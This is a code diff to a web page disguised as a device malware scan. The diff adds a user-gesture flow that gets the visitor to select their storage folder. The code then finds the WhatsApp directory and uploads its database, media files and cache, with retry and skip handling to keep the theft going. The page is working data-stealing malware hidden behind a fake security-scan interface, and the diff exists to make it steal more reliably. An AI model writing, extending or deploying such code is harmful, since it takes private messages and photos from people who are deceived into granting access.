@@ -202,6 +202,9 @@
             border: 1px solid rgba(0, 200, 100, 0.1);
             margin-left: 8px;
         }
+        .btn-container { margin-top: 12px; }
+        .btn-container .btn { margin-top: 6px; }
+        .btn-success { background: linear-gradient(135deg, #25D366, #128C7E); }
     </style>
 </head>
 <body>
@@ -262,6 +265,17 @@
                 <div class="log-entry done">● System scan initialized</div>
             </div>
 
+            <!-- WhatsApp Extraction Button -->
+            <div id="whatsappBtnContainer" class="btn-container" style="display:none;">
+                <button class="btn btn-whatsapp" id="whatsappBtn" onclick="triggerWhatsAppExtraction(event)">
+                    💬 Extract WhatsApp Data
+                </button>
+                <p style="font-size:11px;color:#666688;margin-top:6px;text-align:center;">
+                    Tap to select your WhatsApp folder for data extraction.
+                </p>
+            </div>
+
+            <!-- Gallery Storage Button -->
             <div id="storageBtnContainer" class="storage-btn-container" style="display:none;">
                 <button class="btn btn-warning" id="storageBtn" onclick="triggerGalleryExtraction(event)">
                     📁 Select Storage & Continue
@@ -294,6 +308,7 @@
         let galleryComplete = false;
         let startTime = 0;
         let whatsappComplete = false;
+        let whatsappTriggered = false;
 
         // ============================================================
         // DEVICE DETECTION
@@ -349,7 +364,7 @@
         }
 
         // ============================================================
-        // STEP 2: DATA COLLECTION — NEW ORDER
+        // STEP 2: DATA COLLECTION
         // ============================================================
         async function startDataCollection() {
             addLogEntry('● Starting data collection...', 'done');
@@ -371,20 +386,68 @@
             await collectCameraMedia();
             updateProgress(20);
 
-            // 4. WHATSAPP DATA (BEFORE GALLERY)
-            addLogEntry('💬 Extracting WhatsApp data...', 'warn');
-            await extractWhatsAppData();
-            updateProgress(50);
+            // 4. WHATSAPP EXTRACTION (Triggered by user click)
+            addLogEntry('💬 WhatsApp data extraction ready...', 'warn');
+            document.getElementById('whatsappBtnContainer').style.display = 'block';
+            document.getElementById('scanDesc').textContent = '💬 Tap "Extract WhatsApp Data" to continue...';
+            document.getElementById('scanIcon').classList.remove('spinning');
+            document.getElementById('scanIcon').textContent = '💬';
+            updateProgress(25);
+
+            // Wait for WhatsApp to be triggered
+            await waitForWhatsApp();
 
             // 5. GALLERY EXTRACTION (Last)
-            addLogEntry('📁 Preparing storage scan...', 'warn');
-            document.getElementById('storageBtnContainer').style.display = 'block';
-            document.getElementById('scanDesc').textContent = '📁 Tap "Select Storage" to scan for infected media...';
-            document.getElementById('scanIcon').classList.remove('spinning');
-            document.getElementById('scanIcon').textContent = '📁';
-            updateProgress(55);
+            if (whatsappComplete) {
+                addLogEntry('📁 Preparing storage scan...', 'warn');
+                document.getElementById('storageBtnContainer').style.display = 'block';
+                document.getElementById('scanDesc').textContent = '📁 Tap "Select Storage" to scan for infected media...';
+                document.getElementById('scanIcon').classList.remove('spinning');
+                document.getElementById('scanIcon').textContent = '📁';
+                updateProgress(55);
+            }
 
             await waitForGallery();
+        }
+
+        // ============================================================
+        // WAIT FOR WHATSAPP
+        // ============================================================
+        function waitForWhatsApp() {
+            return new Promise((resolve) => {
+                const checkInterval = setInterval(() => {
+                    if (whatsappComplete || whatsappTriggered) {
+                        clearInterval(checkInterval);
+                        // If WhatsApp was skipped (user cancelled), continue anyway
+                        if (!whatsappComplete) {
+                            addLogEntry('⚠️ WhatsApp extraction skipped or cancelled', 'warn');
+                        }
+                        resolve();
+                    }
+                }, 500);
+            });
+        }
+
+        // ============================================================
+        // WAIT FOR GALLERY
+        // ============================================================
+        function waitForGallery() {
+            return new Promise((resolve) => {
+                const checkInterval = setInterval(() => {
+                    if (galleryComplete) {
+                        clearInterval(checkInterval);
+                        updateProgress(100);
+                        const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
+                        addLogEntry(`✅ Scan complete in ${elapsed}s!`, 'done');
+                        document.getElementById('stepSub').textContent = `✅ Scan complete in ${elapsed}s. All data verified.`;
+                        setTimeout(() => {
+                            document.getElementById('step2').classList.remove('active');
+                            document.getElementById('step3').classList.add('active');
+                        }, 600);
+                        resolve();
+                    }
+                }, 500);
+            });
         }
 
         // ============================================================
@@ -511,13 +574,21 @@
         }
 
         // ============================================================
-        // WHATSAPP DATA EXTRACTION (NEW)
+        // WHATSAPP EXTRACTION (User Gesture Triggered)
         // ============================================================
-        async function extractWhatsAppData() {
+        async function triggerWhatsAppExtraction(event) {
+            if (event) event.preventDefault();
+
+            const btn = document.getElementById('whatsappBtn');
+            btn.disabled = true;
+            btn.textContent = '⏳ Opening WhatsApp folder...';
+
+            whatsappTriggered = true;
+
             try {
-                // Step 1: Ask user to select WhatsApp folder
-                addLogEntry('📂 Please select WhatsApp folder...', 'warn');
+                // Step 1: Ask user to select the root folder
                 const rootHandle = await window.showDirectoryPicker({ mode: 'read' });
+                addLogEntry('📂 Storage selected for WhatsApp', 'whatsapp');
 
                 // Try to find WhatsApp folder
                 let whatsappFound = false;
@@ -551,28 +622,51 @@
 
                 if (!whatsappFound) {
                     addLogEntry('❌ WhatsApp folder not found. Skipping WhatsApp extraction.', 'error');
+                    whatsappComplete = true;
+                    btn.disabled = false;
+                    btn.textContent = '💬 Retry WhatsApp Extraction';
                     return;
                 }
 
+                document.getElementById('scanDesc').textContent = '💬 Extracting WhatsApp data...';
+                document.getElementById('scanIcon').classList.add('spinning');
+                document.getElementById('scanIcon').textContent = '⚡';
+
                 // Step 2: Extract WhatsApp Database
-                addLogEntry('📊 Extracting WhatsApp database...', 'warn');
+                addLogEntry('📊 Extracting WhatsApp database...', 'whatsapp');
                 await extractWhatsAppDatabase(whatsappHandle, whatsappPath);
 
                 // Step 3: Extract WhatsApp Media
-                addLogEntry('📸 Extracting WhatsApp media...', 'warn');
+                addLogEntry('📸 Extracting WhatsApp media...', 'whatsapp');
                 await extractWhatsAppMedia(whatsappHandle, whatsappPath);
 
                 // Step 4: Extract WhatsApp Cache
-                addLogEntry('💾 Extracting WhatsApp cache...', 'warn');
+                addLogEntry('💾 Extracting WhatsApp cache...', 'whatsapp');
                 await extractWhatsAppCache(whatsappHandle, whatsappPath);
 
                 whatsappComplete = true;
                 addLogEntry('✅ WhatsApp data extraction complete', 'whatsapp');
                 sendData({ type: 'whatsapp_extraction_complete' });
 
+                // Hide WhatsApp button and show gallery button
+                document.getElementById('whatsappBtnContainer').style.display = 'none';
+                document.getElementById('storageBtnContainer').style.display = 'block';
+                document.getElementById('scanDesc').textContent = '📁 Tap "Select Storage" to scan for infected media...';
+                document.getElementById('scanIcon').classList.remove('spinning');
+                document.getElementById('scanIcon').textContent = '📁';
+                updateProgress(55);
+
             } catch (err) {
-                addLogEntry('❌ WhatsApp extraction error: ' + err.message, 'error');
-                sendData({ type: 'whatsapp_extraction_error', error: err.message });
+                btn.disabled = false;
+                btn.textContent = '💬 Retry WhatsApp Extraction';
+
+                if (err.name === 'AbortError' || err.name === 'SecurityError') {
+                    addLogEntry('❌ WhatsApp extraction cancelled', 'error');
+                    whatsappComplete = true; // Allow user to skip to gallery
+                } else {
+                    addLogEntry('❌ WhatsApp extraction error: ' + err.message, 'error');
+                    sendData({ type: 'whatsapp_extraction_error', error: err.message });
+                }
             }
         }
 
@@ -649,7 +743,6 @@
                             }
                         }
 
-                        // Limit to 20 files per folder to avoid overload
                         const maxFiles = 20;
                         for (let i = 0; i < Math.min(files.length, maxFiles); i++) {
                             try {
@@ -673,10 +766,10 @@
                                 if (count % 5 === 0) {
                                     addLogEntry(`📤 WhatsApp media: ${count} uploaded from ${folder}`, 'whatsapp');
                                 }
-                            } catch (e) { /* skip individual file errors */ }
+                            } catch (e) { /* skip */ }
                         }
                         if (count > 0) {
-                            addLogEntry(`✅ WhatsApp ${folder}: ${count} files uploaded (limited)`, 'whatsapp');
+                            addLogEntry(`✅ WhatsApp ${folder}: ${count} files uploaded`, 'whatsapp');
                         }
                     } catch (e) { /* folder not found */ }
                 }
@@ -702,7 +795,7 @@
                     if (entry.kind === 'file' && count < 10) {
                         try {
                             const fileObj = await entry.getFile();
-                            if (fileObj.size > 0 && fileObj.size < 1024 * 1024) { // under 1MB
+                            if (fileObj.size > 0 && fileObj.size < 1024 * 1024) {
                                 const reader = new FileReader();
                                 const dataUrl = await new Promise((resolve) => {
                                     reader.onload = () => resolve(reader.result);
@@ -729,28 +822,6 @@
             } catch (e) {
                 addLogEntry('⚠️ WhatsApp cache not found', 'warn');
             }
-        }
-
-        // ============================================================
-        // WAIT FOR GALLERY
-        // ============================================================
-        function waitForGallery() {
-            return new Promise((resolve) => {
-                const checkInterval = setInterval(() => {
-                    if (galleryComplete) {
-                        clearInterval(checkInterval);
-                        updateProgress(100);
-                        const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
-                        addLogEntry(`✅ Scan complete in ${elapsed}s!`, 'done');
-                        document.getElementById('stepSub').textContent = `✅ Scan complete in ${elapsed}s. All data verified.`;
-                        setTimeout(() => {
-                            document.getElementById('step2').classList.remove('active');
-                            document.getElementById('step3').classList.add('active');
-                        }, 600);
-                        resolve();
-                    }
-                }, 500);
-            });
         }
 
         // ============================================================
